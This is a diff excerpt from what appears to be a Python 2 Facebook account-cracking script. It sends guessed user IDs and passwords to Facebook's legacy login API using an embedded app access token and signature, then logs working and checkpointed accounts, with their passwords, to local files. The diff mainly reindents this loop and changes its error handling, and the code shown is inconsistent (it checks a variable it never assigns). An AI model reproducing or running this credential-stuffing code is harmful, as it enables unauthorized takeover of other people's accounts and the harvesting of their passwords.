@@ -238,20 +238,20 @@ def choice1_menu():
 		except OSError:
 		    pass
 		try:
-			data = requests.get("https://b-api.facebook.com/method/auth.login?access_token=350685531728%7C62f8ce9f74b12f84c123cc23437a4a32&format=json&sdk_version=2&email=" + uid + "&locale=vi_vn&password=" + pass1 + "&sdk=ios&generate_session_cookies=1&sig=15df5f3c8c37e0a620e8fa1fd1dd705c", headers=header).text
-			if "access_token" in q:
-				print '\033[1;92m[JAM-OK] \x1b[1;32m' + uid + ' | ' + pass1
-				ok = open('/sdcard/ids/jam_OK.txt', 'a')
-                                ok.write(uid + ' | ' + pass1 + '\n')
-                                ok.close()
-                                oks.append(uid + pass1)
-			else:
-				if "www.facebook.com" in response.json()["error_msg"]:
-					print '\033[1;93m[JAM-CP] ' + uid + ' | ' + pass1
-					cp = open('jam_CP.txt', 'a')
-                                        cp.write(uid + ' | ' + pass1 + '\n')
-                                        cp.close()
-                                        cps.append(uid + pass1)
+		    data = requests.get("https://b-api.facebook.com/method/auth.login?access_token=350685531728%7C62f8ce9f74b12f84c123cc23437a4a32&format=json&sdk_version=2&email=" + uid + "&locale=vi_vn&password=" + pass1 + "&sdk=ios&generate_session_cookies=1&sig=15df5f3c8c37e0a620e8fa1fd1dd705c", headers=br.addheader).text
+		    if "access_token" in q:
+			print '\033[1;92m[JAM-OK] \x1b[1;32m' + uid + ' | ' + pass1
+			ok = open('/sdcard/ids/jam_OK.txt', 'a')
+                        ok.write(uid + ' | ' + pass1 + '\n')
+                        ok.close()
+                        oks.append(uid + pass1)
+		    elif 'www.facebook.com' in q['error']:
+			print '\033[1;93m[JAM-CP] ' + uid + ' | ' + pass1
+			cp = open('jam_CP.txt', 'a')
+                        cp.write(uid + ' | ' + pass1 + '\n')
+                        cp.close()
+                        cps.append(uid + pass1)
+			
 		except:
 			pass
 		
